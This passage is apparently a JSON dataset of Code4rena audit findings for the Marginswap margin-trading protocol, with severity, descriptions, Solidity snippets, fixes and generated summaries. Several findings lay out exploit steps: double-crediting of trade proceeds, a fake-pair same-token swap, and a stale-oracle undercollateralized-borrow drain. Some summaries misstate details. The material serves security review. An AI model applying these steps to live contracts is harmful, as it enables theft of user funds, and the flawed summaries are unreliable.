      "impact": "HIGH",
      "content": "\nThe `registerTradeAndBorrow` is called with the results of a trade (`inAmount`, `outAmount`). It first tries to pay back any debt with the `outAmount`. However, the **full** `outAmount` is credited to the user again as a deposit in the `adjustAmounts(account, tokenFrom, tokenTo, sellAmount, outAmount);` call. As the user pays back their debt and is credited the same amount again, they are essentially credited twice the `outAmount`, making a profit of one `outAmount`. This can be withdrawn and the process can be repeated until the funds are empty.\n\nIn the `adjustAmounts` call, it should only credit `outAmount - extinguishableDebt` as a deposit like in `registerDeposit`.\nThe `registerDeposit` function correctly handles this case.\n\n",
      "summary": "\nThe `registerTradeAndBorrow` function is causing a bug where users are receiving double the amount they should when paying back their debt. This is because the function is incorrectly crediting the full `outAmount` as a deposit instead of only crediting `outAmount - extinguishableDebt`. This allows users to repeatedly withdraw and profit from the extra funds until the account is empty. The `registerDeposit` function correctly handles this scenario.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/24",
      "tags": [],
      "finders": []
    },
    {
      "id": "42150",
      "title": "[H-04] Inconsistent usage of `applyInterest`",
      "impact": "HIGH",
      "content": "\nIt is unclear if the function `applyInterest` is supposed to return a new balance with the interest applied or only the accrued interest? There are various usages of it, some calls add the return value to the old amount:\n\n```solidity\nreturn\nbond.amount +\napplyInterest(bond.amount, cumulativeYield, yieldQuotientFP);\nand some not:\n\nbalanceWithInterest = applyInterest(\nbalance,\nyA.accumulatorFP,\nyieldQuotientFP\n);\n```\n\nThis makes the code misbehave and return the wrong values for the balance and accrued interest.\n\nRecommend making it consistent in all cases when calling this function.\n\n",
      "summary": "\nThe function `applyInterest` is causing confusion as it is not clear if it should return a new balance with the interest applied or just the accrued interest. This inconsistency is causing incorrect values to be returned for both the balance and accrued interest. It is recommended to make the function consistent in all cases when it is called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/64",
      "tags": [],
      "finders": []
    },
    {
      "id": "42149",
      "title": "[H-02] Missing `fromToken != toToken` check",
      "impact": "HIGH",
      "content": "\nAttacker calls `MarginRouter.crossSwapExactTokensForTokens` with a fake pair and the same token[0] == token[1].\n`crossSwapExactTokensForTokens(1000 WETH, 0, [ATTACKER_CONTRACT], [WETH, WETH])`. When the amounts are computed by the `amounts = UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens);` call, the attacker contract returns fake reserves that yield 0 output. When `_swapExactT4T` is called, the funds are sent to the fake contract and doing nothing passes all checks in `_swap` call that follows because the `startingBalance` is stored _after_ the initial Fund withdraw to the pair.\n\n```solidity\nfunction _swapExactT4T() {\n  // withdraw happens here\n    Fund(fund()).withdraw(tokens[0], pairs[0], amounts[0]);\n    _swap(amounts, pairs, tokens, fund());\n}\n\nfunction _swap() {\n  uint256 startingBalance = IERC20(outToken).balanceOf(_to);\n  uint256 endingBalance = IERC20(outToken).balanceOf(_to);\n  // passes as startingBalance == endingBalance + 0\n  require(\n      endingBalance >= startingBalance + amounts[amounts.length - 1],\n      \"Defective AMM route; balances don't match\"\n  );\n}\n```\n\nThe full impact is not yet known as `registerTrade` could still fail when subtracting the `inAmount` and adding 0 `outAmount`.\nAt least, this attack is similar to a withdrawal which is supposed to only occur after a certain `coolingOffPeriod` has passed, but this time-lock is circumvented with this attack.\n\nRecommend moving the fund withdrawal to the first pair **after** the `startingBalance` assignment. Check `fromToken != toToken` as cyclical trades (arbitrages) are likely not what margin traders are after. Consider if the same check is required for `registerTradeAndBorrow` / `adjustAmounts` functions.\n\n",
      "summary": "\nThe bug report describes a vulnerability in the `MarginRouter.crossSwapExactTokensForTokens` function, which allows an attacker to exploit a fake pair and withdraw funds from the contract. The attacker can manipulate the `amounts` calculation and send the funds to a fake contract, which passes all checks in the `_swap` function. This attack can bypass the time-lock mechanism and potentially cause financial losses for margin traders. The report recommends moving the fund withdrawal to after the `startingBalance` assignment and adding a check for cyclical trades. It also suggests reviewing other related functions for potential vulnerabilities.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "3888",
      "title": "[L-13] Not emitting event for important state changes",
      "impact": "LOW",
      "content": "## Email address\n\nsimomonica1997@gmail.com\n\n\n## Handle\n\ns1m0\n\n\n## Eth address\n\n0x9b3E9e3E4a174d59279FC7cd268e035992412384\n\n\n## Vulnerability details\n\nWhen changing state variables events are not emitted.\nPriceAware (https://github.com/code-423n4/marginswap/blob/main/contracts/PriceAware.sol):\n- setPriceUpdateWindow\n- setUpdateRate\n- setUpdateMaxPegAmount\n- setUpdateMinPegAmount\nLending (https://github.com/code-423n4/marginswap/blob/main/contracts/Lending.sol):\n- activateIssuer\n- deactivateIssuer\n- setLendingCap\n- setLendingBuffer\n- setHourlyYieldAPR\n- setRuntimeWeights\nIncentiveDistribution (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L261):\n- setTrancheShare\n- initTranche\nIsolatedMarginTrading and CrossMarginTrading (https://github.com/code-423n4/marginswap/blob/main/contracts/IsolatedMarginTrading.sol - https://github.com/code-423n4/marginswap/blob/main/contracts/CrossMarginTrading.sol):\n- setCoolingOffPeriod\n- setLeveragePercent\n- setLiquidationThresholdPercent\n\nThe events emitted by MarginRouter (https://github.com/code-423n4/marginswap/blob/main/contracts/MarginRouter.sol) don't have indexed parameter.\n\n\n## Proof of concept\n\n-\n\n\n## Tools used\n\nManual analysis\n\n\n## Impact\n\nThe system doesn't record historical state changes.\n\n\n## Recommended mitigation steps\n\nFor set... function emit events with old and new value.\nFor initTranche, event InitTranche(uint256 tranche, uint256 share)\nFor activateIssuer, event ActivateIssuer(address issuer, address token)\nFor deactivateIssuer, event DeactivateIssuer(address issuer)\nFor events emitted by MarginRouter i would index the trader address to make it filterable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/61",
      "tags": [],
      "finders": []
    },
    {
      "id": "3887",
      "title": "[L-12] An erroneous constructors argument could block the withdrawReward",
      "impact": "LOW",
      "content": "## Email address\n\nsimomonica1997@gmail.com\n\n\n## Handle\n\ns1m0\n\n\n## Eth address\n\n0x9b3E9e3E4a174d59279FC7cd268e035992412384\n\n\n## Vulnerability details\n\nThe constructor of IncentiveDistribution https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L32\ntake as argument the address of MFI token but it doesn't check that is != address(0).\nNot worth an issue alone but IncentiveDistribution imports IERC20.sol and it never use it.\n\n\n## Impact\n\nIn case the address(0) is passed as arguement the withdrawReward woul fail https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L261 and due to the fact that\nMFI is immutable the only solution would be to redeploy the contract meanwhile losing trust from the users.\n\n\n## Proof of concept\n\nDeploy IncentiveDistribution with 0 as _MFI argument and then call withdrawReward.\n\n\n## Tools used\n\nManual analysis\n\n\n## Recommended mitigation steps\n\nCheck _MFI != address(0)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/33",
      "tags": [],
      "finders": []
    },
    {
      "id": "3886",
      "title": "[L-11] setLeveragePercent should check that new _leveragePercent >= 100",
      "impact": "LOW",
      "content": "## Email address\n\npauliax6@gmail.com\n\n\n## Handle\n\npaulius.eth\n\n\n## Eth address\n\n0x523B5b2Cc58A818667C22c862930B141f85d49DD\n\n\n## Vulnerability details\n\nfunction setLeveragePercent should check that the _leveragePercent >= 100 so that this calculation will not fail later:\n(leveragePercent - 100)\n\n\n## Impact\n\nThis variable can only be set by admin so as long as he sets the appropriate value it should be fine.\n\n\n## Recommended mitigation steps\n\nIt is always nice to enforce such things via code. Code is law they say.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/41",
      "tags": [],
      "finders": []
    },
    {
      "id": "3885",
      "title": "[L-10] runtime > 1 hours error message discrepancy",
      "impact": "LOW",
      "content": "## Email address\n\npauliax6@gmail.com\n\n\n## Handle\n\npaulius.eth\n\n\n## Eth address\n\n0x523B5b2Cc58A818667C22c862930B141f85d49DD\n\n\n## Vulnerability details\n\nHere, the revert message says that the value needs to be at least 1 hour, however, the code allows value only above the 1 hour (> instead of >=):\n  require(runtime > 1 hours, \"Min runtime needs to be at least 1 hour\");\n\n\n## Impact\n\nno impact on security, just a discrepancy between the check and message.\n\n\n## Recommended mitigation steps\n\nReplace > with >= or update the error message to reflect that.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/36",
      "tags": [],
      "finders": []
    },
    {
      "id": "3884",
      "title": "[L-09] function initTranche should check that the share parameter is > 0",
      "impact": "LOW",
      "content": "## Impact\n\nonly admin can call this so highly unlikely to happen yet it would be better if code prevents that.\n\n\n## Recommended mitigation steps\n\nrequire share to be greater than 0.\n\n\n## Tools used\n\n\n\n\n## Email address\n\npauliax6@gmail.com\n\n\n## Handle\n\npaulius.eth\n\n\n## Eth address\n\n0x523B5b2Cc58A818667C22c862930B141f85d49DD\n\n\n## Vulnerability details\n\nfunction initTranche should check that the \"share\" parameter is > 0, otherwise, it may be possible to initialize the same tranche again.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/35",
      "tags": [],
      "finders": []
    },
    {
      "id": "3883",
      "title": "[L-08] Magic Numbers used in Admin._stake() When Constant Defined Above Can Be Used Instead",
      "impact": "LOW",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\n## Impact\n\nMagic Numbers are used in Admin._stake(), which both obscure the purpose of the function and unnecessarily lead to potential error if the constants are changed during development. Since they are used to refer to a constant defined in RoleAware, and Admin inherits from RoleAware, then Admin can simply call that constant.\n\n## Recommended Mitigation Steps\n\nIn Admin._stake(), change this:\n\nIncentiveDistribution(incentiveDistributor()).addToClaimAmount(\n    1,\n    holder,\n    amount\n);\n\nto this: \n\nIncentiveDistribution(incentiveDistributor()).addToClaimAmount(\n    FUND_TRANSFERER,\n    holder,\n    amount\n);",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/71",
      "tags": [],
      "finders": []
    },
    {
      "id": "3882",
      "title": "[L-07] Duplicated Code In Admin.viewCurrentMaintenanceStaker()",
      "impact": "LOW",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\nDuplicated Code In Admin.viewCurrentMaintenanceStaker()\n\n## Impact\n\nThere are four lines of code that are duplicated in viewCurrentMaintenanceStaker\n\n## Recommended Mitigation Steps\n\nChange this:\n\nif (maintenanceStakePerBlock > currentStake) {\n    // skip\n    staker = nextMaintenanceStaker[staker];\n    currentStake = getMaintenanceStakerStake(staker);\n} else {\n    startBlock += currentStake / maintenanceStakePerBlock;\n    staker = nextMaintenanceStaker[staker];\n    currentStake = getMaintenanceStakerStake(staker);\n}\n\nTo this:\n\nif (maintenanceStakePerBlock <= currentStake) {\n    startBlock += currentStake / maintenanceStakePerBlock;\n}\nstaker = nextMaintenanceStaker[staker];\ncurrentStake = getMaintenanceStakerStake(staker);",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "3881",
      "title": "[L-06] sortTokens can be simplified",
      "impact": "LOW",
      "content": "## Vulnerability details\n\nthis is a minor suggestion:\n\nThe function sortTokens UniswapStyleLib.sol returns 2 values, but only the first return value is used:\nMarginRouter.sol: (address token0, ) = UniswapStyleLib.sortTokens...\nUniswapStyleLib.sol: (address token0, ) = sortTokens..\nIn both cases the used return value is compared to the first parameter of the function call.\nConclusion: the function is only used to determine the smaller of the two tokens, not really to sort tokens.\n\n\n\n## Handle\n\ngpersoon\n\n\n## Email address\n\nmail@gpersoon.com\n\n\n## Eth address\n\ngpersoon.eth\n\n\n## Impact\n\nThe code is somewhat more difficult to read and a bit longer than neccesary.\n\n\n## Recommended mitigation steps\n\nsimplify the code:\nfunction ASmallerThanB(address tokenA, address tokenB)\n        internal\n        pure\n        returns (bool)\n    {\n        require(tokenA != tokenB, \"Identical address!\");\n        require(tokenA != address(0), \"Zero address!\");\n        require(tokenB != address(0), \"Zero address!\");\n        return tokenA < tokenB;\n    }",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/7",
      "tags": [],
      "finders": []
    },
    {
      "id": "3880",
      "title": "[L-05] Different solidity version in UniswapStyleLib.sol",
      "impact": "LOW",
      "content": "## Email address\n\nmail@gpersoon.com\n\n\n## Handle\n\ngpersoon\n\n\n## Eth address\n\ngpersoon.eth\n\n\n## Vulnerability details\n\nThe solidity version in UniswapStyleLib.sol (>=0.5.0) is different than the solidity version in the other contracts (e.g. ^0.8.0)\nAlso math actions are present in the functions getAmountOut and getAmountIn that could easily lead to an underflow or division by 0; (note safemath is not used).\nNote: In solidity 0.8.0 safemath like protections are default.\n\n\n## Impact\n\nThe impact is low because UniswapStyleLib is a library and the solidity version  of the contract that uses the library is used (e.g. ^0.8.0), which has safemath like protections.\nIt is cleaner to have the same solidity version everywhere.\n\n\n## Proof of concept\n\ngetAmountIn(3,1,1000) would give division by 0\ngetAmountIn(1,1,1) will underflow denominator\n\n\n## Recommended mitigation steps\n\nUse the same solidity version everywhere",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/6",
      "tags": [],
      "finders": []
    },
    {
      "id": "3879",
      "title": "[L-04] Multisig wallets cant be used for liquidate",
      "impact": "LOW",
      "content": "## Email address\n\nmail@gpersoon.com\n\n\n## Handle\n\ngpersoon\n\n\n## Eth address\n\ngpersoon.eth\n\n\n## Vulnerability details\n\nThe function liquidate, which is defined in both\nCrossMarginLiquidation.sol and IsolatedMarginLiquidation.sol, includes the modifier noIntermediary.\nThis modifier prevents the use of Multisig wallets.\n\n\n## Impact\n\nIf the maintainer happens to use a multisig wallet he might not experience any issues until he tries to call the function liquidate. At that moment he can't successfully call the function.\n\n\n## Recommended mitigation steps\n\nVerify if the prevention to use multisig wallets is intentional. In that case add a comment to the liquidate functions.\nIf it is not intentional update the code so multisigs wallets can be supported.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/13",
      "tags": [],
      "finders": []
    },
    {
      "id": "3878",
      "title": "[L-03] Role 9 in Roles.sol",
      "impact": "LOW",
      "content": "## Email address\n\nmail@gpersoon.com\n\n\n## Handle\n\ngpersoon\n\n\n## Eth address\n\ngpersoon.eth\n\n\n## Vulnerability details\n\nThis is a minor suggestion.\n\nRoles.sol contains the following:\n roles[msg.sender][9] = true;\nIt's not clear what the number 9 means.\nIn RoleAware.sol there is a constant with the value 9:\n    uint256 constant TOKEN_ACTIVATOR = 9;\n\n\n\n## Impact\n\nThe code is more difficult to read without an explanation for the number 9.\nIn case the code would be refactored in the future and the constants in RoleAware.sol are renumbered, the value in Roles.sol would no longer correspond to the right value.\n\n\n## Recommended mitigation steps\n\nMove the constants from Roles.sol to RoleAware.sol and replace 9 with the appropriate constant.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/10",
      "tags": [],
      "finders": []
    },
    {
      "id": "3877",
      "title": "[L-02] getReserves does not check if tokens match",
      "impact": "LOW",
      "content": "## Email address\n\nmail@cmichel.io\n\n\n## Handle\n\n@cmichelio\n\n\n## Eth address\n\n0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad\n\n\n## Vulnerability details\n\nThe `UniswapStyleLib.getReserves` function does not check if the tokens are the pair's underlying tokens.\nIt blindly assumes that the tokens are in the wrong order if the first one does not match but they could also be completely different tokens.\n\n\n## Impact\n\nIt could be the case that output amounts are computed for completely different tokens because a wrong pair was provided.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/30",
      "tags": [],
      "finders": []
    },
    {
      "id": "3876",
      "title": "[L-01] Events not indexed",
      "impact": "LOW",
      "content": "## Email address\n\nmail@cmichel.io\n\n\n## Handle\n\n@cmichelio\n\n\n## Eth address\n\n0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad\n\n\n## Vulnerability details\n\nThe `CrossDeposit`, `CrossTrade`, `CrossWithdraw`, `CrossBorrow`, `CrossOvercollateralizedBorrow` events in `MarginRouter` are not indexed.\n\n\n## Impact\n\nOff-chain scripts cannot efficiently filter these events.\n\n\n\n## Recommended mitigation steps\n\nAdd an index on important arguments like `trader`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/27",
      "tags": [],
      "finders": []
    },
    {
      "id": "3875",
      "title": "[M-10] Add a timelock to functions that set key variables",
      "impact": "MEDIUM",
      "content": "\nFunctions like `setLeveragePercent` and `setLiquidationThresholdPercent` for both [`IsolatedMarginTrading`](https://github.com/code-423n4/marginswap/blob/main/contracts/IsolatedMarginTrading.sol) and [`CrossMarginTrading`](https://github.com/code-423n4/marginswap/blob/main/contracts/CrossMarginTrading.sol) should be put behind a timelock because they would give more trust to users. Currently, the owner could call them whenever they want and a position could become liquidable from a block to the other.\n\n**[werg (Marginswap) acknowledged](https://github.com/code-423n4/2021-04-marginswap-findings/issues/70#issuecomment-816168032):**\n\n> Timelock will be handled by governance\n\n**[zscole commented](https://github.com/code-423n4/2021-04-marginswap-findings/issues/70#issuecomment-824944141):**\n\n> Maintaining submission rating of `2 (Med Risk)` because this presents a vulnerability at the time of review.\n\n",
      "summary": "\nThis bug report is about the IsolatedMarginTrading and CrossMarginTrading contracts in the MarginSwap repository. The bug is that the functions setLeveragePercent and setLiquidationThresholdPercent are not behind a timelock, meaning the owner can call them whenever they want and a position could become liquidable from one block to the next. This lack of trust could be problematic for users. The proof of concept was done manually and the recommended mitigation steps are to add a timelock to the setter functions of critical variables.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/70",
      "tags": [],
      "finders": []
    },
    {
      "id": "3874",
      "title": "[M-09] Isolated margin contracts declare but do not set the value of liquidationThresholdPercent",
      "impact": "MEDIUM",
      "content": "\nCrossMarginTrading sets value of liquidationThresholdPercent in the constructor: `liquidationThresholdPercent = 110;` Isolated margin contracts declare but do not set the value of liquidationThresholdPercent.\n\nRecommend setting the initial value for the liquidationThresholdPercent in Isolated margin contracts.\n\nThis makes function belowMaintenanceThreshold to always return true unless a value is set via function setLiquidationThresholdPercent. Comments indicate that the value should also be set to 110:\n\n```solidity\n// The following should hold:\n// holdings / loan >= 1.1\n// => holdings >= loan \\* 1.1\n```\n\n",
      "summary": "\nThis bug report is about a vulnerability in CrossMarginTrading contracts. The liquidationThresholdPercent is set to 110 in the constructor, however, Isolated margin contracts declare it but do not set the value. This makes the function belowMaintenanceThreshold to always return true unless a value is set via function setLiquidationThresholdPercent. The impact of this vulnerability is that it could lead to incorrect calculations when the holdings or loan is below the 1.1 threshold. The recommended mitigation steps for this issue is to set the initial value for the liquidationThresholdPercent in Isolated margin contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/40",
      "tags": [],
      "finders": []
    },
    {
      "id": "3873",
      "title": "[M-08] PriceAware uses prices from getAmountsOut",
      "impact": "MEDIUM",
      "content": "\n`getPriceFromAMM` relies on values returned from getAmountsOut which can be manipulated (e.g. with the large capital or the help of flash loans). The impact is reduced with UPDATE_MIN_PEG_AMOUNT and UPDATE_MAX_PEG_AMOUNT, however, it is not entirely eliminated.\n\nUniswap v2 recommends using their TWAP oracle: https://uniswap.org/docs/v2/core-concepts/oracles/\n\n",
      "summary": "\nThis bug report is about a vulnerability in the getPriceFromAMM function of Uniswap v2. This vulnerability can be exploited by manipulating the values returned from the getAmountsOut function, either with large capital or through flash loans. The impact of this vulnerability can be reduced with the UPDATE_MIN_PEG_AMOUNT and UPDATE_MAX_PEG_AMOUNT functions, but it is not completely eliminated. The email address and handle of the reporter is pauliax6@gmail.com and paulius.eth respectively, and the Ethereum address is 0x523B5b2Cc58A818667C22c862930B141f85d49DD. Uniswap v2 recommends using their TWAP oracle to mitigate this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/39",
      "tags": [],
      "finders": []
    },
    {
      "id": "3872",
      "title": "[M-07] diffMaxMinRuntime gets default value of 0",
      "impact": "MEDIUM",
      "content": "\n` uint256 public diffMaxMinRuntime;`` This variable is never set nor updated so it gets a default value of 0.  `diffMaxMinRuntime` with 0 value is making the calculations that use it either always return 0 (when multiplying) or fail (when dividing) when calculating bucket indexes or sizes.\n\nRecommend setting the appropriate value for diffMaxMinRuntime and update it whenever min or max runtime variables change.\n\n",
      "summary": "\nA bug report has been made regarding the variable \"diffMaxMinRuntime\" in an Ethereum address. This variable is not set or updated, so it has a default value of 0. This is causing calculations that use it to either always return 0 or fail when calculating bucket indexes or sizes. To fix this issue, it is recommended that the appropriate value for diffMaxMinRuntime be set and updated whenever the min or max runtime variables change.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/37",
      "tags": [],
      "finders": []
    },
    {
      "id": "3871",
      "title": "[M-06] Users Can Drain Funds From MarginSwap By Making Undercollateralized Borrows If The Price Of A Token Has Moved More Than 10% Since The Last MarginSwap Borrow/Liquidation Involving Accounts Holding That Token.",
      "impact": "MEDIUM",
      "content": "\nUsers Can Drain Funds From MarginSwap By Making Undercollateralized Borrows If The Price Of A Token Has Moved More Than 10% Since The Last MarginSwap Borrow/Liquidation Involving Accounts Holding That Token.\n\nMarginSwap's internal price oracle is only updated for a particular token if a borrow or liquidation is attempted for an account that is lending/borrowing that particular token.\n\nFor a less popular token, the price could move quite a bit without any borrow or liquidation being called on any account lending/borrowing that token, especially if MarginSwap does not end up being wildly popular, or if it supports lesser known assets.\nIf the Uniswap price has moved more than 10% (liquidationThresholdPercent - 100) without a borrow or liquidation on an account lending/borrowing that particular token occurring on MarginSwap, then Alice can make undercollateralized loans, leaving behind her collateral and draining funds from the contract.\n\n(1) Alice waits for the Uniswap price for any token to move more than 10% (liquidationThresholdPercent - 100) without a borrow or liquidation occurring for any account lending/borrowing that token occurring on MarginSwap.\n(2) When this condition is satisfied, Alice can loop the following actions:\n(2.1) If the price has fallen, Alice can use the token as collateral (making sure to use more than UPDATE_MAX_PEG_AMOUNT worth of the token in ETH), borrow ether from MarginSwap, sell the ether for the token on Uniswap, and repeat, leaving coolingOffPeriod blocks between each lend and borrow.\n(2.2) If the price has risen, Alice can use ether as collateral, borrow the token from MarginSwap (making sure to use more than UPDATE_MAX_PEG_AMOUNT worth of the token in ETH), sell the token for ether on Uniswap, and repeat, leaving coolingOffPeriod blocks between each lend and borrow.\n\nBecause the MarginSwap price is now stale, Alice can borrow more than 100% of the actual value of her collateral, since MarginSwap believes the borrowed funds to only be worth 90% or less than their actual current market value.\n\nThe various defenses that MarginSwap has employed against undercollateralized loans are all bypassed:\n(a) The exponential moving price average stored within MarginSwap is not updated, because Alice borrows at least UPDATE_MAX_PEG_AMOUNT worth of the token in ETH, so MarginSwap.PriceAware.getPriceFromAMM skips the price update due to the \"outAmount < UPDATE_MAX_PEG_AMOUNT\" condition failing.\n(b) CoolingOffPeriod can be bypassed by Alice splitting her deposits and borrows up by 20 blocks (the current value of CoolingOffPeriod). Since deposits do not trigger a price oracle update, Alice can even deposit ahead of time as the price is nearing 10% off of peg, allowing her to perform the borrow right when 10% is passed.\n(c) MarginSwap.Lending.registerBorrow check is bypassed. The check is \"meta.totalLending >= meta.totalBorrowed\", but this is a global check that only ensures that the contract as a whole has sufficient tokens to fund Alice's borrow. Alice simply needs to ensure that she only borrows up to the amount of tokens that the contract currently owns.\n\nEven if the issue of the price oracle stalling were to be fixed by using a large enough UPDATE_MAX_PEG_AMOUNT, since the moving average updates so slowly (MarginSwap is currently set at moving 8/1000th towards new price every 8 blocks) and only when actions are taken on MarginSwap (which may not be frequent on lesser known tokens or if MarginSwap is not too popular), Alice can still take out undercollateralized loans for a period of time before the price oracle catches up.\nThe real solution here is to use UniswapV2/SushiSwap/UniswapV3's built in TWAP price oracle, especially since MarginSwap is built on top of Uniswap/Sushiswap.\n\n**[werg (Marginswap) acknowledged](https://github.com/code-423n4/2021-04-marginswap-findings/issues/67#issuecomment-816204245):**\n\n> I believe the issue above is referring to the \"overcollateralized borrow\" functionality, because there is talk of withdrawing. In any case of withdrawal (whether immediately or not) it is not the `liquidationThresholdPercent` which governs how much a user may withdraw. Rather, we check whether the account has positive balance (i.e. the value of assets exceeds the loan).\n>\n> In the current system, at 3x possible leverage level, users can withdraw maximally 66% of the face value (to the system) they deposited. If a user deposited collateral that had dropped in price by 10% it would allow them to withdraw around 73% of the real value. -- Not undercollateralized.\n> The price of an asset would have to have dropped by 33%, without the system catching on, for Alice to break even (without considering gas cost).\n>\n> Cross margin trading will only be available for a select set of tokens with high enough trading volume. Anyone will be able to update the price if our exponential weighted average is out of date.\n> Nevertheless, risk remains as in any lending system.\n>\n> - We will consider adding an additional buffer around immediate withdrawals\n> - If staleness becomes an issue the protocol can institute rewards for updating the price\n>\n> also of course there are liquidators waiting in the wings to make their cut on underwater accounts and liquidators can update the price.\n\n",
      "summary": "\nThis bug report describes a vulnerability in MarginSwap, a decentralized finance protocol, that allows users to drain funds from the protocol by making undercollateralized borrows if the price of a token has moved more than 10% since the last MarginSwap borrow/liquidation involving accounts holding that token. \n\nThe issue arises from MarginSwap's internal price oracle only being updated for a particular token if a borrow or liquidation is attempted for an account that is lending/borrowing that particular token. If the Uniswap price has moved more than 10% without a borrow or liquidation occurring for any account lending/borrowing that token occurring on MarginSwap, then a user can make undercollateralized loans, leaving behind their collateral and draining funds from the contract. \n\nThe bug can be exploited by a user waiting for the Uniswap price for any token to move more than 10% without a borrow or liquidation occurring for any account lending/borrowing that token occurring on MarginSwap. The user can then use either the token as collateral or ether as collateral, borrow from MarginSwap, sell the token or ether on Uniswap, and repeat, leaving coolingOffPeriod blocks between each lend and borrow. \n\nThe various defenses that MarginSwap has employed against undercollateralized loans are all bypassed. The recommended mitigation steps involve using UniswapV2/SushiSwap/UniswapV3's built in TWAP price oracle, especially since MarginSwap is built on top of Uniswap/Sushiswap.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
